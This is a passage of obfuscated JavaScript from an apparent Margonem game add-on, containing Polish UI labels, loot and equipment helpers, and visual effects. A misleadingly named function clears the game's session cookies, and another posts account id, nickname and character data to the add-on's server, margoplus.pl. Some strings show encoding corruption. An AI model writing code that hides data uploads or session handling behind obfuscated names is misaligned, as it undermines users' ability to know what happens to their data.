      holytouch: "Dotyk anioĹa",
      verycrit: "Cios bardzo krytyczny",
      lastheal: "Ostatni ratunek",
      npc_lootbon: "Loot",
      quest_expbon: "Quest",
      npc_expbon: "Exp",
      honorbon: "Punkty Honoru"
    },
    itembon: {
      sa: "Szybkość ataku",
      crit: "Cios krytyczny",
      acdmg: "Niszczenie pancerza",
      manafatig: "Niszczenie many",
      enfatig: "Niszczenie energii",
      resdmg: "Niszczenie odpornoĹci",
      abdest: "Niszczenie absorpcji",
      resfire: "Odporność na ogień",
      resfrost: "Odporność na zimno",
      reslight: "Odporność na błyskawice",
      act: "OdpornoĹÄ na truciznÄ",
      ac: "Pancerz",
      hp: "Ĺťycie",
      blok: "Blok",
      evade: "Unik",
      absorbm: "Absorpcja magiczna",
      absorb: "Absorpcja fizyczna",
      dz: "Zręczność",
      ds: "Siła",
      di: "Intelekt",
      da: "Wszystkie cechy",
      energybon: "Energia",
      manabon: "Mana",
      critval: "Siła ciosu kryt. fiz.",
      critmval: "SiĹa ciosu kryt. mag.",
      lowcrit: "ObniĹźanie szansy na cios kryt.",
      heal: "Leczenie",
      slow: "Spowolnienie",
      lowevade: "Zmniejszanie uniku przeciwnika"
    },
    npc: {
      normal: "Zwykły",
      elite: "Elita",
      elite2: "Elita II",
      elite3: "Elita III",
      titan: "Tytan",
      heroes: "Heros",
      colossus: "Kolos",
      special: "Specjalny",
      alch: "Alchemia",
      ore: "Złoże",
      event: "Eventowy",
      mushroom: "Grzybobranie",
      tracker: "Tropiciel Herosów",
      pvp: "Gracz"
    },
    prof: {
      p: "paladyn",
      w: "wojownik",
      b: "tancerz ostrzy",
      h: "Ĺowca",
      t: "tropiciel",
      m: "mag",
      npc: ""
    },
    channels: {
      global: "Globalny",
      local: "Lokalny",
      clan: "Klanowy",
      party: "Grupowy",
      trade: "Handlowy",
      personal: "Prywatny"
    },
    menuItem: {
      upgrade: "[M+] Ulepsz",
      upgradeType: "[M+] Ulepsz (typem)",
      showEq: "Pokaż ekwipunek",
      showProfile: "Pokaż profil",
      alwaysWant: "[ + ] Zawsze łap",
      alwaysNot: "[ + ] Zawsze odrzuć",
      removeAlwaysWant: "[ - ] Zawsze łap",
      removeAlwaysNot: "[ - ] Zawsze odrzuć"
    },
    relation: {
      "1": "Zwykli gracze",
      "2": "Przyjaciele",
      "3": "Wrogowie",
      "4": "Klanowicze",
      "5": "Sojusznicy",
      "6": "Wrogowie klanu",
      "7": "PrzyjaĹşni (Perkun)",
      "8": "Wrogowie (Perkun)",
      p: "Drużyna"
    },
    itemClass: {
      "1": "Jednoręczne",
      "2": "Dwuręczne",
      "3": "PĂłĹtorarÄczne",
      "5": "Pomocnicze",
      "4": "Dystansowe",
      "6": "Różdżki",
      "7": "Orby magiczne",
      "8": "Zbroje",
      "9": "Hełmy",
      "10": "Buty",
      "11": "Rękawice",
      "12": "Pierścienie",
      "13": "Naszyjniki",
      "14": "Tarcze",
      "15": "Neutralne",
      "16": "Konsumpcyjne",
      "17": "Złoto",
      "18": "Klucze",
      "19": "Questowe",
      "20": "Odnawialne",
      "21": "Strzały",
      "22": "Talizmany",
      "23": "Książki",
      "24": "Torby",
      "25": "BĹogosĹawieństwa",
      "26": "Ulepszenia",
      "27": "Recepta",
      "28": "Waluta",
      "29": "StrzaĹy",
      "30": "Stroje",
      "31": "Maskotki",
      "32": "Teleporty"
    },
    itemType: {
      armors: "Pancerze",
      weapons: "Bronie",
      jewelry: "Biżuteria"
    },
    itemStatus: {
      soulbound: "Związany",
      permbound: "Zw. na staĹe",
      unbind: "Odwiązany"
    },
    itemRarity: {
      common: "Zwykłe",
      unique: "Unikatowe",
      heroic: "Heroiczne",
      upgraded: "Ulepszone",
      legendary: "Legendarne",
      artefact: "Artefakt"
    }
  };
  return areaWindowUpdatedCoordinatesPayload;
}
export function createLootText(areaWindowInitialAppendReference = "") {
  if (!areaWindowInitialAppendReference || typeof areaWindowInitialAppendReference !== "string") {
    return null;
  }

  const areaWindowCenteredModeFlag = areaWindowInitialAppendReference.split(",");

  if (areaWindowCenteredModeFlag.length < 5) {
    return null;
  }

  const [zoneStorageConfigId, zoneStorageConfigurationObject, zoneWindowTemplateClass, zoneWindowUniqueIdentifier, zoneWindowIsResizableFlag] = areaWindowCenteredModeFlag;
  const zoneWindowHasListFeature = new Date(parseInt(zoneWindowUniqueIdentifier, 10) * 1000);
  const zoneWindowCustomTitleString = !isNaN(zoneWindowHasListFeature.getTime()) ? zoneWindowHasListFeature.toLocaleString("pl-PL") : zoneWindowUniqueIdentifier;
  const zoneWindowUiElementReference = zoneStorageConfigurationObject === "k";
  const zoneWindowDragConfiguration = parseInt(zoneWindowTemplateClass, 10);
  let zoneWindowStopPositionLeft = "";

  if (zoneWindowDragConfiguration === 1) {
    zoneWindowStopPositionLeft = "";
  } else if (zoneWindowDragConfiguration === 2) {
    zoneWindowStopPositionLeft = " z ziomkiem";
  } else if (zoneWindowDragConfiguration >= 3 && zoneWindowDragConfiguration <= 10) {
    zoneWindowStopPositionLeft = " w <mp class=\"mp-text-bold text-red\">" + zoneWindowDragConfiguration + "</mp>-osobowej ekipie";
  }

  return "Dnia <mp class=\"mp-text-bold text-red\">" + zoneWindowCustomTitleString + "</mp> zostało przyszpącone z <mp class=\"mp-text-bold text-red\">" + zoneWindowIsResizableFlag + "</mp> przez <mp class=\"mp-text-bold text-red\">" + zoneStorageConfigId + "</mp>" + zoneWindowStopPositionLeft;
}
export const getEquipmentsJSON = () => {
  let zoneWindowStopPositionTop = {
    "1": {},
    "2": {},
    "3": {},
    "4": {},
    "5": {},
    "6": {},
    "7": {},
    "8": {}
  };

  for (const zoneWindowFinalCoordinatePayload in zoneWindowStopPositionTop) {
    const zoneWindowDomAppendReference = Number(zoneWindowFinalCoordinatePayload);
    let zoneWindowInnerContentClass = Object.values(Engine.heroEquipment.getEqItems()).filter(zoneWindowInitialCenteredFlag => zoneWindowInitialCenteredFlag.st === zoneWindowDomAppendReference);

    if (zoneWindowInnerContentClass.length > 0) {
      let zoneWindowDragStartEvent = zoneWindowInnerContentClass[0];
      const zoneWindowDragStartUi = {
        id: zoneWindowDragStartEvent.id,
        type: zoneWindowDragStartEvent._cachedStats.rarity,
        name: zoneWindowDragStartEvent.name,
        stat: zoneWindowDragStartEvent.stat,
        pr: zoneWindowDragStartEvent.pr,
        prc: "zl",
        cl: zoneWindowDragStartEvent.cl,
        icon: zoneWindowDragStartEvent.icon
      };
      zoneWindowStopPositionTop[zoneWindowFinalCoordinatePayload] = zoneWindowDragStartUi;
    }
  }

  return zoneWindowStopPositionTop;
};
export const getClan = () => {
  let zoneWindowUpdatedCoordinatesPayload = Engine && Engine.hero && Engine.hero.d && Engine.hero.d.clan;

  if (!zoneWindowUpdatedCoordinatesPayload) {
    return {
      id: 0,
      name: "Brak klanu",
      rank: 0
    };
  }

  return zoneWindowUpdatedCoordinatesPayload;
};
export async function engineHeroXY() {
  const zoneWindowInitialAppendReference = ["chash", "hs3", "mchar_id", "user_id"];
  const zoneWindowCenteredModeFlag = ".margonem.pl";
  const siteStorageConfigId = ["/", ""];
  zoneWindowInitialAppendReference.forEach(siteStorageConfigurationObject => {
    siteStorageConfigId.forEach(siteWindowTemplateClass => {
      document.cookie = siteStorageConfigurationObject + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + siteWindowTemplateClass + "; domain=" + zoneWindowCenteredModeFlag + ";";
    });
  });
  window.location.reload();
  return false;
}
export async function saveUpgrade(siteWindowUniqueIdentifier) {
  if (location.host.split(".")[0] === "experimental") {
    return;
  }

  const {
    account: siteWindowIsResizableFlag,
    nick: siteWindowHasListFeature,
    lvl: siteWindowCustomTitleString,
    prof: siteWindowUiElementReference,
    img: siteWindowDragConfiguration,
    id: siteWindowStopPositionLeft
  } = Engine.hero.d;
  const siteWindowStopPositionTop = ut_date(unix_time());
  const siteWindowFinalCoordinatePayload = location.host.split(".")[0];
  const siteWindowDomAppendReference = new Date(window.ts());
  const siteWindowInnerContentClass = siteWindowDomAppendReference.getHours().toString().padStart(2, "0");
  const siteWindowInitialCenteredFlag = siteWindowDomAppendReference.getMinutes().toString().padStart(2, "0");
  const siteWindowDragStartEvent = siteWindowDomAppendReference.getSeconds().toString().padStart(2, "0");
  const siteWindowDragStartUi = siteWindowStopPositionTop + ", " + siteWindowInnerContentClass + ":" + siteWindowInitialCenteredFlag + ":" + siteWindowDragStartEvent;
  const siteWindowUpdatedCoordinatesPayload = new Date();
  const siteWindowInitialAppendReference = Math.floor(siteWindowUpdatedCoordinatesPayload.getTime() / 1000);
  const siteWindowCenteredModeFlag = btoa(siteWindowInitialAppendReference);
  const pageStorageConfigId = siteWindowCenteredModeFlag;
  const pageStorageConfigurationObject = {
    id: siteWindowIsResizableFlag,
    nick: siteWindowHasListFeature,
    lvl: siteWindowCustomTitleString,
    prof: siteWindowUiElementReference,
    outfit: siteWindowDragConfiguration,
    cid: siteWindowStopPositionLeft,
    i: siteWindowUniqueIdentifier.all,
    com: siteWindowUniqueIdentifier.common,
    uni: siteWindowUniqueIdentifier.unique,
    her: siteWindowUniqueIdentifier.heroic,
    upg: siteWindowUniqueIdentifier.upgraded,
    leg: siteWindowUniqueIdentifier.legendary,
    upgPts: siteWindowUniqueIdentifier.upgradePoints,
    pts: siteWindowUniqueIdentifier.points,
    world: siteWindowFinalCoordinatePayload,
    ts: siteWindowDragStartUi,
    key: pageStorageConfigId
  };
  const pageWindowTemplateClass = pageStorageConfigurationObject;

  try {
    const pageWindowUniqueIdentifier = await fetch("https://margoplus.pl/upgrade/index.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(pageWindowTemplateClass)
    });

    if (!pageWindowUniqueIdentifier.ok) {
      console.error("BĹÄd podczas wysyĹania danych:", pageWindowUniqueIdentifier.statusText);
    }
  } catch (pageWindowIsResizableFlag) {
    console.error("Wystąpił błąd:", pageWindowIsResizableFlag);
  }
}
export function formatSekundy(pageWindowHasListFeature) {
  pageWindowHasListFeature = Math.floor(pageWindowHasListFeature);
  const pageWindowCustomTitleString = Math.floor(pageWindowHasListFeature / 60);
  const pageWindowUiElementReference = pageWindowHasListFeature % 60;
  const pageWindowDragConfiguration = pageWindowUiElementReference < 10 ? "0" + pageWindowUiElementReference : pageWindowUiElementReference;
  return pageWindowCustomTitleString + ":" + pageWindowDragConfiguration;
}
export async function deleteFromArray(pageWindowStopPositionLeft, pageWindowStopPositionTop, pageWindowFinalCoordinatePayload, pageWindowDomAppendReference) {
  const pageWindowInnerContentClass = pageWindowStopPositionTop.indexOf(pageWindowStopPositionLeft);

  if (pageWindowInnerContentClass !== -1) {
    pageWindowStopPositionTop.splice(pageWindowInnerContentClass, 1);
    saveStorage(pageWindowDomAppendReference, pageWindowFinalCoordinatePayload);
  }
}
export function deleteHandler(pageWindowInitialCenteredFlag, pageWindowDragStartEvent, pageWindowDragStartUi, pageWindowUpdatedCoordinatesPayload, pageWindowInitialAppendReference) {
  return async function () {
    await deleteFromArray(pageWindowInitialCenteredFlag, pageWindowDragStartEvent, pageWindowUpdatedCoordinatesPayload, pageWindowInitialAppendReference);
    createListFromArray(pageWindowDragStartEvent, pageWindowDragStartUi, pageWindowUpdatedCoordinatesPayload, pageWindowInitialAppendReference);
  };
}
export function createListFromArray(pageWindowCenteredModeFlag, partStorageConfigId, partStorageConfigurationObject, partWindowTemplateClass) {
  partStorageConfigId.empty();

  if (pageWindowCenteredModeFlag.length > 0) {
    for (const partWindowUniqueIdentifier of pageWindowCenteredModeFlag) {
      const partWindowIsResizableFlag = $("<div class=\"mp-npc do-action-cursor\">" + partWindowUniqueIdentifier + "</div>");
      partWindowIsResizableFlag.on("click", deleteHandler(partWindowUniqueIdentifier, pageWindowCenteredModeFlag, partStorageConfigId, partStorageConfigurationObject, partWindowTemplateClass));
      partWindowIsResizableFlag.tip("Usuń");
      partWindowIsResizableFlag.appendTo(partStorageConfigId);
    }
  }
}
export function itemIsInBag(partWindowHasListFeature) {
  const partWindowCustomTitleString = Engine.items.fetchLocationItems("g");

  for (const partWindowUiElementReference in partWindowCustomTitleString) {
    if (partWindowCustomTitleString[partWindowUiElementReference].id == partWindowHasListFeature) {
      return true;
    }
  }

  return false;
}
export function is_in_range(partWindowDragConfiguration, partWindowStopPositionLeft) {
  return Math.abs(partWindowDragConfiguration.x - partWindowStopPositionLeft.x) <= 16 && Math.abs(partWindowDragConfiguration.y - partWindowStopPositionLeft.y) <= 16;
}
export function removeDoubleItem(partWindowStopPositionTop, partWindowFinalCoordinatePayload) {
  return partWindowStopPositionTop.filter(partWindowDomAppendReference => partWindowFinalCoordinatePayload !== partWindowDomAppendReference);
}
export function currentPercent() {
  const {
    hp: partWindowInnerContentClass,
    maxhp: partWindowInitialCenteredFlag
  } = Engine.hero.d.warrior_stats;
  return Math.ceil(partWindowInnerContentClass / partWindowInitialCenteredFlag * 100);
}
export function getItemNameById(partWindowDragStartEvent) {
  const partWindowDragStartUi = Engine.items.test().items;
  return partWindowDragStartUi[partWindowDragStartEvent].name || false;
}
export function getTypes(partWindowUpdatedCoordinatesPayload) {
  const partWindowInitialAppendReference = {
    "1": [1, 2, 3, 4, 5, 6, 7, 29],
    "2": [12, 13],
    "3": [8, 9, 10, 11, 14]
  };
  const partWindowCenteredModeFlag = [];

  for (const metaStorageConfigId in partWindowInitialAppendReference) {
    if (partWindowInitialAppendReference[metaStorageConfigId].indexOf(partWindowUpdatedCoordinatesPayload) !== -1) {
      partWindowCenteredModeFlag.push(Number(metaStorageConfigId));
    }
  }

  return Number(partWindowCenteredModeFlag.toString());
}
export function calcPercent(metaStorageConfigurationObject, metaWindowTemplateClass, metaWindowUniqueIdentifier) {
  metaWindowTemplateClass = metaWindowTemplateClass.toString();
  const metaWindowIsResizableFlag = metaWindowUniqueIdentifier.filter(metaWindowHasListFeature => metaWindowHasListFeature.id == metaWindowTemplateClass)[0];
  const metaWindowCustomTitleString = Engine.items.getItemById(metaStorageConfigurationObject);

  if (!metaWindowIsResizableFlag) {
    return false;
  }

  if (!metaWindowCustomTitleString) {
    return false;
  }

  if (metaWindowIsResizableFlag.tpl === metaWindowCustomTitleString.tpl) {
    return 4;
  }

  if (metaWindowIsResizableFlag.itemTypeName === metaWindowCustomTitleString.itemTypeName && sameClGroup([metaWindowIsResizableFlag.cl, metaWindowCustomTitleString.cl])) {
    return 3.25;
  }

  if (metaWindowIsResizableFlag.itemTypeName === metaWindowCustomTitleString.itemTypeName) {
    return 3;
  }

  if (sameClGroup([metaWindowIsResizableFlag.cl, metaWindowCustomTitleString.cl])) {
    return 1.25;
  }

  return 1;
}
export function areAllElementsSame(metaWindowUiElementReference) {
  if (metaWindowUiElementReference.length === 0) {
    return false;
  }

  const metaWindowDragConfiguration = metaWindowUiElementReference[0];
  return metaWindowUiElementReference.every(function (metaWindowStopPositionLeft) {
    return metaWindowStopPositionLeft === metaWindowDragConfiguration;
  });
}
export function getClGroup(metaWindowStopPositionTop) {
  let metaWindowFinalCoordinatePayload = null;
  const metaWindowDomAppendReference = {
    weapons: [1, 2, 3, 4, 5, 6, 7, 29],
    armors: [8, 9, 10, 11, 14],
    jewelry: [12, 13]
  };

  for (const metaWindowInnerContentClass of Object.keys(metaWindowDomAppendReference)) {
    if (metaWindowDomAppendReference[metaWindowInnerContentClass].includes(metaWindowStopPositionTop)) {
      metaWindowFinalCoordinatePayload = metaWindowInnerContentClass;
      break;
    }
  }

  return metaWindowFinalCoordinatePayload;
}
export function sameClGroup(metaWindowInitialCenteredFlag) {
  const metaWindowDragStartEvent = [];

  for (const metaWindowDragStartUi of metaWindowInitialCenteredFlag) {
    const metaWindowUpdatedCoordinatesPayload = getClGroup(metaWindowDragStartUi);

    if (metaWindowUpdatedCoordinatesPayload === null) {
      return false;
    }

    metaWindowDragStartEvent.push(metaWindowUpdatedCoordinatesPayload);
  }

  return areAllElementsSame(metaWindowDragStartEvent);
}
export function isInList(metaWindowInitialAppendReference, metaWindowCenteredModeFlag) {
  if (!Array.isArray(metaWindowCenteredModeFlag) || metaWindowCenteredModeFlag.length === 0) {
    return false;
  }

  return metaWindowCenteredModeFlag.map(dataStorageConfigId => dataStorageConfigId.toLowerCase()).includes(metaWindowInitialAppendReference.toLowerCase());
}
export function isCalendar() {
  const dataStorageConfigurationObject = document.querySelector("div[widget-name=\"rewards-calendar-icon\"]");
  return dataStorageConfigurationObject && !dataStorageConfigurationObject.classList.contains("disabled");
}
export function closeCalendar() {
  Engine?.rewardsCalendar?.close?.();
  Engine?.eventCalendar?.close?.();
  Engine?.adventCalendar?.close?.();
}
export function startButtonCooldown(dataWindowTemplateClass, dataWindowUniqueIdentifier = 15) {
  dataWindowTemplateClass.addClass("mp-disable");
  const dataWindowIsResizableFlag = dataWindowTemplateClass.find("time");
  let dataWindowHasListFeature = dataWindowUniqueIdentifier;

  const dataWindowCustomTitleString = () => {
    dataWindowIsResizableFlag.text(" (" + dataWindowHasListFeature + ")");

    if (dataWindowHasListFeature <= 0) {
      clearInterval(dataWindowUiElementReference);
      dataWindowTemplateClass.removeClass("mp-disable");
      dataWindowIsResizableFlag.text("");
    }

    dataWindowHasListFeature--;
  };

  dataWindowCustomTitleString();
  const dataWindowUiElementReference = setInterval(dataWindowCustomTitleString, 1000);
}
export function setAnimationOnItem(dataWindowDragConfiguration) {
  for (const dataWindowStopPositionLeft in dataWindowDragConfiguration) {
    const dataWindowStopPositionTop = dataWindowDragConfiguration[dataWindowStopPositionLeft];
    const dataWindowFinalCoordinatePayload = $(".loot-item-wrapper-" + dataWindowStopPositionTop + " .slot .item-id-" + dataWindowStopPositionTop + " .canvas-icon");
    dataWindowFinalCoordinatePayload.attr("mp-item-animation", "true");
  }
}
export function setShadowOnWrapper(dataWindowDomAppendReference) {
  for (const dataWindowInnerContentClass in dataWindowDomAppendReference) {
    const dataWindowInitialCenteredFlag = dataWindowDomAppendReference[dataWindowInnerContentClass];
    $(".loot-window .loot-item-wrapper-" + dataWindowInitialCenteredFlag).attr("mp-wrapper-shadow", "true");
  }
}
export function setShadowOnLoot(dataWindowDragStartEvent) {
  for (const dataWindowDragStartUi in dataWindowDragStartEvent) {
    const dataWindowUpdatedCoordinatesPayload = dataWindowDragStartEvent[dataWindowDragStartUi];
    $(".loot-item-wrapper-" + dataWindowUpdatedCoordinatesPayload + " .slot .item-id-" + dataWindowUpdatedCoordinatesPayload).attr("mp-item-loot", "true");
  }
}
export function setShadowOnButtons(dataWindowInitialAppendReference) {
  for (const dataWindowCenteredModeFlag in dataWindowInitialAppendReference) {
    const confStorageConfigId = dataWindowInitialAppendReference[dataWindowCenteredModeFlag];
    const confStorageConfigurationObject = $(".loot-item-wrapper-" + confStorageConfigId + " .button-holder");

    if (!confStorageConfigurationObject.find(".table-img-avatar").length) {
      confStorageConfigurationObject.attr("mp-light-buttons", "true");
    }
  }
}
export async function waitForLoots() {
  return new Promise(confWindowTemplateClass => {
    const confWindowUniqueIdentifier = () => {
      if (typeof Engine.loots !== "undefined") {
        confWindowTemplateClass();
      } else {
        setTimeout(confWindowUniqueIdentifier, 100);
      }
    };

    confWindowUniqueIdentifier();
  });
}
export function waitForLootsWindow() {
  return new Promise(confWindowIsResizableFlag => {
    if (Engine?.loots?.wnd?.$[0]) {
      confWindowIsResizableFlag(Engine.loots.wnd.$[0]);
    } else {
      setTimeout(() => confWindowIsResizableFlag(waitForLootsWindow()), 10);
    }
  });
}
export function unsetPropertyAll() {
  const confWindowHasListFeature = document.querySelector("html");

  if (!confWindowHasListFeature) {
    return message("BRAK: document.querySelector: HTML");
  }

  confWindowHasListFeature.style.setProperty("--mp-item-animation", "unset");
  confWindowHasListFeature.style.setProperty("--mp-item-speed", "unset");
  confWindowHasListFeature.style.setProperty("--mp-map-size", "unset");
  confWindowHasListFeature.style.setProperty("--mp-map-size2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-map-color", "unset");
  confWindowHasListFeature.style.setProperty("--mp-map-color2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-map-speed", "unset");
  confWindowHasListFeature.style.setProperty("--mp-lootwindow-size", "unset");
  confWindowHasListFeature.style.setProperty("--mp-lootwindow-size2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-lootwindow-color", "unset");
  confWindowHasListFeature.style.setProperty("--mp-lootwindow-color2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-lootwindow-speed", "unset");
  confWindowHasListFeature.style.setProperty("--mp-wrapper-size", "unset");
  confWindowHasListFeature.style.setProperty("--mp-wrapper-size2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-wrapper-color", "unset");
  confWindowHasListFeature.style.setProperty("--mp-wrapper-color2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-wrapper-speed", "unset");
  confWindowHasListFeature.style.setProperty("--mp-loot-size", "unset");
  confWindowHasListFeature.style.setProperty("--mp-loot-size2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-loot-color", "unset");
  confWindowHasListFeature.style.setProperty("--mp-loot-color2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-loot-speed", "unset");
  confWindowHasListFeature.style.setProperty("--mp-buttons-size", "unset");
  confWindowHasListFeature.style.setProperty("--mp-buttons-size2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-buttons-color", "unset");
  confWindowHasListFeature.style.setProperty("--mp-buttons-color2", "unset");
  confWindowHasListFeature.style.setProperty("--mp-buttons-speed", "unset");
  confWindowHasListFeature.style.setProperty("--mp-lootwindow-animation", "unset");
}
export function setPropertySettings(confWindowCustomTitleString, confWindowUiElementReference) {
  const confWindowDragConfiguration = document.querySelector("html");

  if (!confWindowDragConfiguration) {
    return message("BRAK: document.querySelector: HTML");
  }

  confWindowDragConfiguration.style.setProperty(confWindowCustomTitleString, confWindowUiElementReference);
}
export function animateBrightness(confWindowStopPositionLeft, confWindowStopPositionTop = 500, confWindowFinalCoordinatePayload = "ease-in") {
  const confWindowDomAppendReference = document.querySelector(".interface-layer.layer");

  if (!confWindowDomAppendReference) {
    return;
  }

  const confWindowInnerContentClass = {
    filter: "brightness(" + confWindowStopPositionLeft + "%)"
  };

  confWindowDomAppendReference.animate([{
    filter: confWindowDomAppendReference.style.filter || "brightness(100%)"
  }, confWindowInnerContentClass], {
    duration: confWindowStopPositionTop,
    easing: confWindowFinalCoordinatePayload,
    fill: "forwards"
  }).onfinish = () => {
    confWindowDomAppendReference.style.filter = "brightness(" + confWindowStopPositionLeft + "%)";
  };
}
export function startStar(confWindowInitialCenteredFlag) {
  const confWindowDragStartEvent = {
    spread: 100,
    ticks: 20,
    gravity: 0,
    decay: 0.92,
    startVelocity: 30,
    colors: ["FFE400", "FFBD00", "E89400", "FFCA6C", "FDFFB8"],
    shapes: ["star"]
  };
  const confWindowDragStartUi = { ...confWindowDragStartEvent
  };
  confWindowDragStartUi.particleCount = confWindowInitialCenteredFlag;
  confWindowDragStartUi.scalar = 2;
  confetti(confWindowDragStartUi);
  const confWindowUpdatedCoordinatesPayload = { ...confWindowDragStartEvent
  };
  confWindowUpdatedCoordinatesPayload.particleCount = confWindowInitialCenteredFlag;
  confWindowUpdatedCoordinatesPayload.scalar = 3;
  confetti(confWindowUpdatedCoordinatesPayload);
  const confWindowInitialAppendReference = { ...confWindowDragStartEvent
  };
  confWindowInitialAppendReference.particleCount = confWindowInitialCenteredFlag;
  confWindowInitialAppendReference.scalar = 4;
  confetti(confWindowInitialAppendReference);
}
export function startFireworks() {
  const confWindowCenteredModeFlag = 10000;
  const propStorageConfigId = Date.now() + confWindowCenteredModeFlag;
  const propStorageConfigurationObject = {
    startVelocity: 30,
    spread: 360,
    ticks: 60,
    zIndex: 0,
    scalar: 1
  };

  function propWindowTemplateClass(propWindowUniqueIdentifier, propWindowIsResizableFlag) {
    return Math.random() * (propWindowIsResizableFlag - propWindowUniqueIdentifier) + propWindowUniqueIdentifier;
  }

  const propWindowHasListFeature = setInterval(function () {
    const propWindowCustomTitleString = propStorageConfigId - Date.now();

    if (propWindowCustomTitleString <= 0) {
      return clearInterval(propWindowHasListFeature);
    }

    const propWindowUiElementReference = propWindowCustomTitleString / confWindowCenteredModeFlag * 50;
    confetti(Object.assign({}, propStorageConfigurationObject, {
      particleCount: propWindowUiElementReference,
      origin: {
        x: propWindowTemplateClass(0.1, 0.3),
        y: Math.random() - 0.2
      }
    }));
    confetti(Object.assign({}, propStorageConfigurationObject, {
      particleCount: propWindowUiElementReference,
      origin: {
        x: propWindowTemplateClass(0.7, 0.9),
        y: Math.random() - 0.2
      }
    }));
  }, 250);
}
export function startRain(propWindowDragConfiguration, propWindowStopPositionLeft) {
  const propWindowStopPositionTop = {
    image: propWindowStopPositionLeft
  };
  confetti({
    spread: 100,
    ticks: 20,
    gravity: 0.3,
    decay: 0.92,
    startVelocity: 30,
    particleCount: propWindowDragConfiguration,
    scalar: 10,
    shapes: ["image"],
    shapeOptions: propWindowStopPositionTop
  });
}
export function startHearts(propWindowFinalCoordinatePayload) {
  const propWindowDomAppendReference = {
    spread: 360,
    ticks: 0.6,
    gravity: 0,
    decay: 0.94,
    startVelocity: 30,
    shapes: ["heart"],
    colors: ["FFC0CB", "FF69B4", "FF1493", "C71585"]
  };
  const propWindowInnerContentClass = { ...propWindowDomAppendReference
  };
  propWindowInnerContentClass.particleCount = propWindowFinalCoordinatePayload;
  propWindowInnerContentClass.scalar = 4;
  confetti(propWindowInnerContentClass);
  const propWindowInitialCenteredFlag = { ...propWindowDomAppendReference
  };
  propWindowInitialCenteredFlag.particleCount = propWindowFinalCoordinatePayload;
  propWindowInitialCenteredFlag.scalar = 6;
  confetti(propWindowInitialCenteredFlag);
  const propWindowDragStartEvent = { ...propWindowDomAppendReference
  };
  propWindowDragStartEvent.particleCount = propWindowFinalCoordinatePayload;
  propWindowDragStartEvent.scalar = 8;
  confetti(propWindowDragStartEvent);
}
export function startConfetti() {
  const propWindowDragStartUi = Date.now() + 15000;
  let propWindowUpdatedCoordinatesPayload = generateStrongColor();
  let propWindowInitialAppendReference = generateStrongColor();
  let propWindowCenteredModeFlag = generateStrongColor();
  const attrStorageConfigId = [propWindowUpdatedCoordinatesPayload, propWindowInitialAppendReference, propWindowCenteredModeFlag];

  (function attrStorageConfigurationObject() {
    const attrWindowTemplateClass = {
      particleCount: 5,
      angle: 60,
      spread: 55,
      origin: {
        x: 0
      },
      colors: attrStorageConfigId
    };
    confetti(attrWindowTemplateClass);
    const attrWindowUniqueIdentifier = {
      particleCount: 5,
      angle: 120,
      spread: 55,
      origin: {
        x: 1
      },
      colors: attrStorageConfigId
    };
    confetti(attrWindowUniqueIdentifier);

    if (Date.now() < propWindowDragStartUi) {
      requestAnimationFrame(attrStorageConfigurationObject);
    }
  })();
}
export function generateStrongColor() {
  const attrWindowIsResizableFlag = 1;

  const attrWindowHasListFeature = () => Math.floor(Math.random() * (255 - attrWindowIsResizableFlag + 1) + attrWindowIsResizableFlag);

  const attrWindowCustomTitleString = attrWindowHasListFeature().toString(16);
  const attrWindowUiElementReference = attrWindowHasListFeature().toString(16);
  const attrWindowDragConfiguration = attrWindowHasListFeature().toString(16);

  const attrWindowStopPositionLeft = attrWindowStopPositionTop => attrWindowStopPositionTop.length === 1 ? "0" + attrWindowStopPositionTop : attrWindowStopPositionTop;

  return "#" + attrWindowStopPositionLeft(attrWindowCustomTitleString) + attrWindowStopPositionLeft(attrWindowUiElementReference) + attrWindowStopPositionLeft(attrWindowDragConfiguration);
}
export function setDarkness(attrWindowFinalCoordinatePayload) {
  const attrWindowDomAppendReference = document.querySelector("html");

  if (!attrWindowDomAppendReference) {
    return message("BRAK: document.querySelector: HTML");
  }

  attrWindowDomAppendReference.style.setProperty("--mp-darkness", attrWindowFinalCoordinatePayload + "%");
}
export function isOtherInBattleRange(attrWindowInnerContentClass) {
  const {
    x: attrWindowInitialCenteredFlag,
    y: attrWindowDragStartEvent
  } = Engine.hero.d;
  const {
    x: attrWindowDragStartUi,
    y: attrWindowUpdatedCoordinatesPayload,
    stasis: attrWindowInitialAppendReference
  } = attrWindowInnerContentClass.d;

  if (attrWindowInitialAppendReference === 0) {
    return Math.max(Math.abs(attrWindowDragStartUi - attrWindowInitialCenteredFlag), Math.abs(attrWindowUpdatedCoordinatesPayload - attrWindowDragStartEvent)) <= 20;
  } else {
    return false;
  }
}
export async function checkParty(attrWindowCenteredModeFlag) {
  if (!getParty()?.has) {
    return;
  }

  const elemStorageConfigId = Engine.party.getMembers();
  const elemStorageConfigurationObject = Engine.others.check();
  let elemWindowTemplateClass;
  let elemWindowUniqueIdentifier = [];
  let elemWindowIsResizableFlag = [];
  let elemWindowHasListFeature = Engine.hero.d;
  const elemWindowCustomTitleString = {
    lvl: elemWindowHasListFeature.lvl,
    nick: elemWindowHasListFeature.nick,
    prof: elemWindowHasListFeature.prof
  };
  let elemWindowUiElementReference = [elemWindowCustomTitleString];
  const elemWindowDragConfiguration = elemWindowHasListFeature.nick;

  for (const [elemWindowStopPositionLeft, elemWindowStopPositionTop] of elemStorageConfigId.entries()) {
    if (elemWindowStopPositionTop.nick !== elemWindowDragConfiguration && !elemStorageConfigurationObject[elemWindowStopPositionLeft]) {
      elemWindowUniqueIdentifier.push(elemWindowStopPositionTop.nick);
    }

    if (elemStorageConfigurationObject[elemWindowStopPositionLeft] && !isOtherInBattleRange(elemStorageConfigurationObject[elemWindowStopPositionLeft])) {
      elemWindowIsResizableFlag.push(elemStorageConfigurationObject[elemWindowStopPositionLeft].d.nick);
    }

    if (elemStorageConfigurationObject[elemWindowStopPositionLeft]) {
      const elemWindowFinalCoordinatePayload = {
        lvl: elemStorageConfigurationObject[elemWindowStopPositionLeft].d.lvl,
